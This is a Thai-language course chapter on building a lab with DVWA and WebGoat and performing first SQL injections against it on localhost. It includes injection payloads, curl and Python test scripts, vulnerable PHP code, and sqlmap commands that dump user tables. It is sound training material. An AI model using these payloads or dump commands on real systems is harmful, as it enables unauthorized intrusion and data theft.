# Part 010: การตั้งค่า Lab และการทดสอบ SQL Injection ครั้งแรก

## ภาพรวม

ก่อนทดสอบจริง: ตั้งค่า lab environment, เครื่องมือพื้นฐาน, และ injection แรกในสภาพแวดล้อมที่ปลอดภัย

**ขั้นตอนที่ 181-200**

---

## 181. Lab Environment Overview

```
ตัวเลือก Lab Environment:

1. Local Docker (แนะนำ):
   - ง่าย, ปลอดภัย, ลบทิ้งได้
   - ไม่กระทบระบบจริง

2. Virtual Machine:
   - Kali Linux + DVWA/OWASP WebGoat
   - แยก network จาก host

3. Cloud Lab:
   - HackTheBox, TryHackMe (online)
   - ไม่ต้องติดตั้งเอง

4. PortSwigger Web Academy:
   - Labs ฟรี, เรียนพร้อมทำ
   - https://portswigger.net/web-security

สิ่งสำคัญ: ทดสอบเฉพาะใน lab/environment ที่ได้รับอนุญาตเท่านั้น!
```

---

## 182. ติดตั้ง DVWA ด้วย Docker

```bash
# DVWA = Damn Vulnerable Web Application
# จงใจทำให้มีช่องโหว่ สำหรับการเรียนรู้

# Run DVWA:
docker run -d \
  --name dvwa \
  -p 80:80 \
  vulnerables/web-dvwa

# เข้าใช้งาน:
# http://localhost/setup.php
# Login: admin / password
# Click: Create / Reset Database

# ตั้ง Security Level เป็น 'low' สำหรับเริ่มต้น:
# DVWA Security -> Submit -> Low

# Stop:
docker stop dvwa
docker rm dvwa
```

---

## 183. ติดตั้ง WebGoat (OWASP)

```bash
# WebGoat: Lab สำหรับ web vulnerabilities ครบวงจร

docker run -d \
  --name webgoat \
  -p 8080:8080 \
  -p 9090:9090 \
  webgoat/goat-and-wolf

# เข้าใช้งาน:
# http://localhost:8080/WebGoat
# Register new account -> เข้าสู่ระบบ

# SQL Injection lessons อยู่ใน:
# A1 Injection -> SQL Injection
```

---

## 184. ติดตั้ง Tools พื้นฐาน

```bash
# Burp Suite Community (free):
# Download: https://portswigger.net/burp/communitydownload
# ใช้เป็น proxy ระหว่าง browser และ server

# SQLMap:
pip install sqlmap
# หรือ
git clone https://github.com/sqlmapproject/sqlmap.git
python sqlmap/sqlmap.py --version

# curl (built-in ส่วนใหญ่):
curl --version

# Python requests:
pip install requests

# Kali Linux (มีทุกอย่างครบ):
docker run -it kalilinux/kali-rolling /bin/bash
apt update && apt install -y sqlmap burpsuite curl python3
```

---

## 185. ทดสอบ SQL Injection ครั้งแรกใน DVWA

```
ขั้นตอน:

1. เปิด DVWA -> SQL Injection
2. URL จะเป็น: http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit
3. ในช่อง "User ID" ใส่: 1
   -> ผล: First name: admin, Surname: admin

4. ใส่: 1'
   -> ผล: Error! Syntax error
   -> นี่คือสัญญาณว่ามี SQL injection!

5. ใส่: 1' OR '1'='1
   -> ผล: แสดงผู้ใช้ทั้งหมด!
   -> SQL ที่ทำงานจริง:
   SELECT * FROM users WHERE user_id = '1' OR '1'='1'

6. ใส่: 1' OR '1'='1' --  (มี space หลัง --)
   -> ผลเหมือนกัน
```

---

## 186. Vulnerable Code ใน DVWA

```php
<?php
// DVWA low.php - ตัวอย่าง vulnerable code:

$id = $_REQUEST['id'];

$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
// ^^^ โดย concat string โดยตรง!

$result = mysqli_query($GLOBALS["___mysqli_ston"], $getid);

while ($row = mysqli_fetch_assoc($result)) {
    $first  = $row["first_name"];
    $last   = $row["last_name"];
    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
}

// เมื่อ id = "1' OR '1'='1"
// query กลายเป็น:
// SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1'
// = ดึงข้อมูลทุก user!
?>
```

---

## 187. ทดสอบด้วย curl

```bash
# ทดสอบ SQL injection ผ่าน curl

# Normal request:
curl 'http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie 'PHPSESSID=abc123; security=low'

# Test injection:
curl 'http://localhost/vulnerabilities/sqli/?id=1%27&Submit=Submit' \
  --cookie 'PHPSESSID=abc123; security=low'
# %27 = URL-encoded single quote

# OR injection:
curl "http://localhost/vulnerabilities/sqli/?id=1'+OR+'1'%3D'1&Submit=Submit" \
  --cookie 'PHPSESSID=abc123; security=low'

# ดู response:
curl -s 'http://localhost/vulnerabilities/sqli/?id=1%27&Submit=Submit' \
  --cookie 'PHPSESSID=abc123; security=low' | grep -i 'error\|first name\|syntax'
```

---

## 188. Python Script สำหรับทดสอบ

```python
import requests

# Session สำหรับ DVWA (ต้อง login ก่อน)
session = requests.Session()

# Login:
login_data = {
    'username': 'admin',
    'password': 'password',
    'Login': 'Login',
    'user_token': '',  # ต้องดึง CSRF token จริง
}
session.post('http://localhost/login.php', data=login_data)
session.cookies.set('security', 'low')

# Test payloads:
payloads = [
    "1",           # normal
    "1'",          # single quote
    "1' OR '1'='1",  # auth bypass
    "1 ORDER BY 1-- -",  # column count test
    "1 ORDER BY 2-- -",
    "1 ORDER BY 3-- -",  # error = 2 columns
]

for payload in payloads:
    r = session.get(
        'http://localhost/vulnerabilities/sqli/',
        params={'id': payload, 'Submit': 'Submit'}
    )
    
    status = 'ERROR' if 'error' in r.text.lower() else 'OK'
    count = r.text.count('First name')  # นับผล
    print(f"[{status}] Payload: {payload!r:30} -> {count} results, len={len(r.text)}")
```

---

## 189. ทำความเข้าใจ Output

```
อ่านผลการทดสอบ:

Payload: "1"          -> 1 result  = ปกติ
Payload: "1'"         -> ERROR     = injectable!
Payload: "1' OR '1'='1" -> 5 results = auth bypass สำเร็จ!

Payload: "1 ORDER BY 1" -> 1 result  = มีอย่างน้อย 1 column
Payload: "1 ORDER BY 2" -> 1 result  = มีอย่างน้อย 2 columns
Payload: "1 ORDER BY 3" -> ERROR     = มีแค่ 2 columns!

ตอนนี้เรารู้:
1. มี SQL injection
2. Query มี 2 columns
3. พร้อมสำหรับ UNION-based extraction ต่อไป
```

---

## 190. SQLMap อัตโนมัติ

```bash
# SQLMap ตรวจหาและ exploit SQL injection อัตโนมัติ

# Basic scan:
python sqlmap.py -u 'http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie='PHPSESSID=abc123; security=low' \
  --batch  # ตอบ yes อัตโนมัติ

# ดู databases:
python sqlmap.py -u 'http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie='PHPSESSID=abc123; security=low' \
  --dbs --batch

# ดู tables ใน dvwa database:
python sqlmap.py -u 'http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie='PHPSESSID=abc123; security=low' \
  -D dvwa --tables --batch

# ดึงข้อมูล users table:
python sqlmap.py -u 'http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie='PHPSESSID=abc123; security=low' \
  -D dvwa -T users --dump --batch
```

---

## สรุป

Lab Setup:
- **DVWA/WebGoat** - intentionally vulnerable apps
- **Burp Suite** - proxy + scanner
- **SQLMap** - automated detection/exploitation
- **curl/Python** - manual testing
- **Lab rules** - ทดสอบเฉพาะใน authorized environment

ทำ injection ครั้งแรกสำเร็จ → Part 011 จะเรียน Detection techniques อย่างเป็นระบบ

---

*Part 010 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
